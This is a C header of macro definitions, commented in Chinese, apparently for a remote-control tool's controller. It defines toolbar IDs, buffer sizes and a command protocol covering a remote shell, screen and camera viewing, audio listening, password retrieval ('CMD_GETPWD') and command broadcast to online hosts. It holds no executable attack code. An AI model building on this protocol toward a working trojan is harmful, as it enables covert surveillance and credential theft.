//程序宏定义

#pragma once

//任务托盘
#define WM_SHOWTASK (WM_USER + 101)  //自定义托盘消息

//工具栏宏定义

#define ID_RES_FILE       1001
#define ID_RES_SCREEN     1002
#define ID_RES_CMD        1003
#define ID_RES_SYSTEM     1004
#define ID_RES_CAMERA     1005
#define ID_RES_SEPARATE   0        //分隔符
#define ID_RES_RECYCLE    1006
#define ID_RES_SEETING    1007
#define ID_RES_ABOUT      1008

//主对话框状态栏资源
#define ID_RES_COPYRIGHT   1009   //关于软件
#define ID_RES_LISTENPORT  1010   //监听端口
#define ID_RES_ONLINE      1011   //在线主机

//文件管理状态栏资源
#define ID_RES_FILE1       1012
#define ID_RES_FILE2       1013

//CMDShell管理状态栏资源
#define ID_RES_CMD1       1014
#define ID_RES_CMD2       1015

//系统管理状态栏资源
#define ID_RES_SYSTEM1     1016
#define ID_RES_SYSTEM2     1017

//远程命令广播状态栏资源
#define ID_RES_REMOTECMD1   1018
#define ID_RES_REMOTECMD2   1019

//数据传输的缓冲区大小
#define CONTEXT_BUF_SIZE   (1024 * 4)

//自定义上下线消息
#define ID_MSG_ONLINE   WM_USER + 1   //上线
#define ID_MSG_OFFLINE  WM_USER + 2  //下线

//IP地址缓冲区大小
#define IPADDR_SIZE  32

//屏幕传输的缓冲区大小
#define SCREEN_BUF_SIZE  4030

//视屏传输缓冲区大小
#define VIDEO_BUF_SIZE   4020

//语音传输缓冲区大小
#define AUDIO_BUF_SIZE   4078

//剪贴板传输缓冲区大小
#define CLIPBOARD_BUF_SIZE   4078

//上线信息标题
#define MSG_CAPTION_ONLINE       _T("上线提醒")
//下线信息标题
#define MSG_CAPTION_OFFLINE      _T("下线提醒")

#define FILE_ACTIVE_UPLOAD       _T("上传")
#define FILE_ACTIVE_DOWNLOAD     _T("下载")

//---------------------------------------------------------------------------
//消息提示窗口资源
#define ID_TIMER_POP_WINDOW		1051   //弹出窗口
#define ID_TIMER_CLOSE_WINDOW	1052   //关闭窗口
#define ID_TIMER_DISPLAY_DELAY	1053   //延迟
//消息提示窗口大小
#define WIN_WIDTH	181    //宽度
#define WIN_HEIGHT	116    //高度


#define ID_FILE_MANAGER     1001    //文件管理
#define ID_SCREEN_MANAGER   1002    //屏幕查看
#define ID_CMDSHELL_MANAGER 1003    //CMDShell
#define ID_SYS_MANAGER      1004    //系统管理
#define ID_VIDEO_MANAGER    1005    //摄像头


//-------------------------------------------------------------------------
//指令宏定义
#define CMD_SHAKEHAND        0x01       //握手验证   
#define CMD_SYSINFO          0x02       //系统信息
#define CMD_DISKINFO         0x03       //磁盘信息
#define CMD_FILELIST         0x04       //文件列表
#define CMD_DOWNLOAD         0x05       //文件下载
#define CMD_UPLOAD           0x06       //文件上传(命令)
#define CMD_FILEUPLOAD       0x07       //文件数据上传
#define CMD_FILEEXEC         0x08       //文件执行
#define CMD_REFRESH          0x09       //刷新
#define CMD_FOLDER_CREATE    0x10       //创建目录(文件夹)
#define CMD_FILE_DEL         0x11       //文件（夹）删除
#define CMD_FILE_COPY        0x12       //文件的复制
#define CMD_FILE_PASTE       0x13       //文件的粘贴
#define CMD_FILE_RENAME      0x14       //文件(夹)重命名
#define CMD_ATTRIBUTE        0x15       //属性

#define CMD_TELNET           0x16       //开启远程终端
#define CMD_COMMOND          0x17       //发送命令

#define CMD_CHATMSG          0x18       //聊天消息
#define CMD_PROGRESS         0x19       //进程管理
#define CMD_PROC_TASKKILL    0x20       //关闭进程
#define CMD_SCREEN           0x21       //屏幕查看
#define CMD_GETPWD           0x22       //获取系统的帐号密码
#define CMD_VIDEO_VIEW       0x23       //视屏查看
#define CMD_OPERATOR         0x24       //关机/注销/重启
#define CMD_AUDIO            0x25       //语音监听
#define CMD_BROADCAST        0x26       //远程命令广播
#define CMD_DESKTOP          0x27       //桌面管理